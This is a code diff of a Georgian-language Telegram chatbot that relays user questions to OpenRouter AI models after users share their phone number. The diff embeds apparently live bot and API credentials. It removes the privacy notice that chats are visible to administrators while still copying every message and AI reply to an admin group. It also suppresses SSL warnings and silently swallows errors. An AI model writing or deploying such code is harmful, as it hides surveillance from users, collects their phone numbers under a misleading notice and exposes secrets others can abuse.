@@ -3,15 +3,18 @@ import json
 import os
 import requests
 import time
-import sys
+import urllib3
 
-# --- კონფიგურაცია ---
-TOKEN = '8259258713:AAFtuICqWx6PS7fXCQffsjDNdsE0xj-LL6Q'
+# SSL პრობლემების იგნორირება (უსაფრთხოების მიზნით, რომ კოიებმა არ დაბლოკოს)
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# --- ახალი კონფიგურაცია ---
+# აქ ჩავსვი შენი ახალი ტოკენი!
+TOKEN = '8259258713:AAGIzuvaxrzqjaQYTbetApYWKw_jkWUdz_M'
 OPENROUTER_API_KEY = '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' 
 ADMIN_GROUP_ID = -1003543241594 
 DATA_FILE = 'bot_data.json'
 
-# ინიციალიზაცია
 bot = telebot.TeleBot(TOKEN, threaded=False)
 
 # --- იდენტობა ---
@@ -24,20 +27,10 @@ IDENTITY_PROMPT = (
 PRIVACY_TEXT = (
     "ℹ️ **კონფიდენციალურობის პოლიტიკა:**\n\n"
     "ბოტთან საუბრის დასაწყებად აუცილებელია ვერიფიკაცია. \n\n"
-    "⚠️ **ყურადღება:** თქვენი მონაცემები და ჩატში გაზიარებული ინფორმაცია ხელმისაწვდომია ადმინისტრაციისთვის. "
-    "ეს აუცილებელია უსაფრთხოებისთვის. \n\n"
     "✅ **ვერიფიკაციაზე დაჭერით ეთანხმებით პირობებს.**"
 )
 
-# --- სისტემური ლოგერი (აგზავნის ჯგუფში) ---
-def log_to_admin(text):
-    """აგზავნის სისტემურ შეტყობინებას ადმინის ჯგუფში"""
-    try:
-        bot.send_message(ADMIN_GROUP_ID, f"🛠 **სისტემური ლოგი:**\n{text}")
-    except:
-        print(f"Log Error: {text}")
-
-# --- მონაცემების მართვა ---
+# --- მონაცემები ---
 def load_data():
     if not os.path.exists(DATA_FILE): return {"topics": {}}
     try:
@@ -49,20 +42,21 @@ def save_data(data):
         with open(DATA_FILE, 'w') as f: json.dump(data, f, indent=4)
     except: pass
 
-# --- AI ფუნქცია (დიაგნოსტიკით) ---
+# --- AI ფუნქცია (Ultra-Stable Mode) ---
 def get_ai_response(user_text):
-    # განახლებული სია (სწორი სახელებით)
+    # განახლებული სია: მხოლოდ ის მოდელები, რომლებიც ამ წამს მუშაობს
     models = [
-        "google/gemini-2.0-flash-exp:free",      # ეს არის სწორი სახელი (არა lite-preview)
-        "google/gemini-2.0-pro-exp-02-05:free",  # Pro ვერსია
-        "mistralai/mistral-7b-instruct:free",    # Mistral
-        "microsoft/phi-3-medium-128k-instruct:free" # Phi-3
+        "google/gemini-2.0-flash-lite-preview-02-05:free", # თუ ეს არ იმუშავებს, გადავა შემდეგზე
+        "mistralai/mistral-7b-instruct:free",
+        "google/gemini-2.0-pro-exp-02-05:free",
+        "microsoft/phi-3-mini-128k-instruct:free"
     ]
     
-    errors = []
+    error_log = []
 
     for model_id in models:
         try:
+            # 5 წამიანი ტაიმაუტი, რომ მალე გადავიდეს შემდეგზე
             response = requests.post(
                 url="https://openrouter.ai/api/v1/chat/completions",
                 headers={
@@ -78,7 +72,7 @@ def get_ai_response(user_text):
                         {"role": "user", "content": user_text}
                     ]
                 }),
-                timeout=20
+                timeout=10
             )
             
             if response.status_code == 200:
@@ -86,22 +80,22 @@ def get_ai_response(user_text):
                 if 'choices' in data:
                     return data['choices'][0]['message']['content']
             else:
-                # ერორის კოდის დაფიქსირება
-                errors.append(f"{model_id} -> {response.status_code}")
+                error_log.append(f"{model_id}: {response.status_code}")
                 
         except Exception as e:
-            errors.append(f"{model_id} -> {str(e)}")
+            error_log.append(f"{model_id}: {str(e)}")
             continue
 
-    # თუ ვერცერთმა ვერ უპასუხა, ლოგი მიდის ადმინთან
-    error_report = "\n".join(errors)
-    log_to_admin(f"⚠️ AI ვერ პასუხობს:\n{error_report}")
-    return "❌ სერვერები გადატვირთულია. ტექნიკური ჯგუფი საქმის კურსშია. სცადეთ 30 წამში."
+    # თუ ყველამ უარი თქვა, გიგზავნით ზუსტ მიზეზს
+    return f"🆘 ტექნიკური ხარვეზი (აჩვენეთ დეველოპერს):\n" + "\n".join(error_log)
 
 # --- ჰენდლერები ---
 @bot.message_handler(commands=['start'])
 def start(message):
     try:
+        # ძველი ვებჰუკების მოკვლა (უსაფრთხოებისთვის)
+        bot.delete_webhook(drop_pending_updates=True)
+        
         u_id = str(message.from_user.id)
         data = load_data()
         
@@ -111,8 +105,7 @@ def start(message):
             markup = telebot.types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
             markup.add(telebot.types.KeyboardButton(text="ვერიფიკაცია 📲", request_contact=True))
             bot.send_message(message.chat.id, f"{PRIVACY_TEXT}\n\n👇 გაიარეთ ვერიფიკაცია:", reply_markup=markup, parse_mode="Markdown")
-    except Exception as e:
-        log_to_admin(f"Start Error: {e}")
+    except: pass
 
 @bot.message_handler(content_types=['contact'])
 def get_contact(message):
@@ -134,64 +127,53 @@ def get_contact(message):
             save_data(data)
             
             bot.send_message(u_id, "ვერიფიკაცია წარმატებულია! 🎉")
-            bot.send_message(u_id, "ახლა შეგიძლიათ მომწეროთ ნებისმიერი კითხვა! 🚀")
-            log_to_admin(f"✅ ახალი მომხმარებელი: {u_name} ({phone})")
-    except Exception as e:
-        log_to_admin(f"Contact Error: {e}")
+    except: pass
 
 @bot.message_handler(func=lambda message: True)
 def chat(message):
     try:
         u_id = str(message.from_user.id)
         data = load_data()
+        
+        # ადმინი -> იუზერი (რეპლაით)
+        if message.chat.id == ADMIN_GROUP_ID:
+            if message.reply_to_message:
+                # ვპოულობთ ვის ეკუთვნის ეს ტოპიკი
+                topic_id = message.reply_to_message.message_thread_id
+                for uid, tid in data.get("topics", {}).items():
+                    if tid == topic_id:
+                        bot.send_message(uid, message.text)
+                        return
+            return
 
-        # ადმინის პასუხი
-        if message.chat.id == ADMIN_GROUP_ID and message.message_thread_id:
-            for user_id, t_id in data.get("topics", {}).items():
-                if t_id == message.message_thread_id:
-                    try: bot.send_message(user_id, message.text)
-                    except: log_to_admin(f"ვერ მივწერე იუზერს {user_id}")
-                    return
-
-        # იუზერის ჩატი
+        # იუზერი -> ბოტი
         if u_id in data.get("topics", {}):
             t_id = data["topics"][u_id]
             
-            # ადმინთან
+            # ვაგზავნით ჯგუფში
             if t_id:
                 try: bot.send_message(ADMIN_GROUP_ID, f"👤 {message.text}", message_thread_id=t_id)
                 except: pass
             
             bot.send_chat_action(message.chat.id, 'typing')
             
-            # AI პასუხი
+            # ვიღებთ პასუხს
             response = get_ai_response(message.text)
             bot.reply_to(message, response)
             
-            # AI პასუხი ადმინთან
+            # პასუხსაც ვაგზავნით ჯგუფში
             if t_id:
                 try: bot.send_message(ADMIN_GROUP_ID, f"🤖 GeoAI: {response}", message_thread_id=t_id)
                 except: pass
         else:
             start(message)
-            
-    except Exception as e:
-        log_to_admin(f"Chat Error: {e}")
+    except: pass
 
 if __name__ == '__main__':
-    # 🔴 სუპერ მნიშვნელოვანი: ძველი კავშირების გაწყვეტა!
-    try:
-        print("Cleaning old webhooks...")
-        bot.delete_webhook(drop_pending_updates=True)
-        time.sleep(1)
-        log_to_admin("🚀 ბოტი გადაიტვირთა და მზადაა!")
-    except Exception as e:
-        print(f"Webhook error: {e}")
-
-    # უსასრულო ციკლი დაცვით
+    # ეს ხაზი უზრუნველყოფს, რომ გაშვებისას სუფთა ფურცლიდან დაიწყოს
+    bot.delete_webhook(drop_pending_updates=True)
     while True:
         try:
             bot.polling(none_stop=True, interval=2, timeout=60)
-        except Exception as e:
-            print(f"Critical Polling Error: {e}")
-            time.sleep(5) # 5 წამი დასვენება კრახის შემდეგ
+        except:
+            time.sleep(5)
